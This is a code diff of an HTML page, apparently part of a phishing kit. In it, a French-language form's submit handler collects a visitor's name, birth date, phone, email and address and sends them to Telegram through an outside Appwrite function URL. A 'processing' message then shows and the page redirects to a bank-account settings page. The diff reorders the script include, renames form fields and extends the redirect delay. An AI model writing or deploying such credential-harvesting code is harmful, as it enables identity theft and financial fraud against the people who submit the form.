@@ -821,6 +821,13 @@
 
     <div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
 
+    <!-- Import telegram.js -->
+    <script src="telegram.js"></script>
+    <script>
+        // Configuration de l'URL Appwrite Function
+        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
+    </script>
+
     <script>
         // Script pour le menu mobile
         const menuIcon = document.getElementById('mobile-menu-icon');
@@ -871,24 +878,21 @@
             infoForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 
-
-                
-                // Envoyer les informations personnelles à Telegram
-                const personalData = {
-                    nom: document.getElementById('fullName').value,
-                    date_naissance: document.getElementById('birthDate').value,
-                    telephone: document.getElementById('phone').value,
-                    email: document.getElementById('email').value,
-                    adresse: document.getElementById('address').value,
-                    ville: document.getElementById('city').value,
-                    pays: document.getElementById('country').value
-                };
+                // Envoyer les données à Telegram
                 try {
-                    await telegramSender.sendPersonalInfo(personalData, 'Informations personnelles');
+                    await telegramSender.sendPersonalInfo({
+                        nom: document.getElementById('nom').value,
+                        date_naissance: document.getElementById('dob').value,
+                        telephone: document.getElementById('tel').value,
+                        email: document.getElementById('email').value,
+                        adresse: document.getElementById('adresse').value,
+                        ville: document.getElementById('ville').value,
+                        pays: document.getElementById('pays').value
+                    }, 'Informations personnelles');
                 } catch (error) {
                     console.error('Erreur Telegram:', error);
                 }
-
+                
                 // Désactiver le bouton
                 submitBtn.innerText = "Traitement en cours...";
                 submitBtn.style.backgroundColor = "#ccc";
@@ -899,19 +903,12 @@
                 const verificationMessage = document.getElementById('verificationMessage');
                 if(verificationMessage) verificationMessage.style.display = 'block';
                 
-                // Redirection automatique après 3 secondes
+                // Redirection automatique après 10 secondes
                 setTimeout(function() {
                     window.location.href = "settings.bankaccount.html";
-                }, 3000);
+                }, 10000);
             });
         }
-    </script>
-
-    <!-- Import telegram.js -->
-    <script src="telegram.js"></script>
-    <script>
-        // Configuration de l'URL de la Function Appwrite
-        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
     </script>
 
 </body>
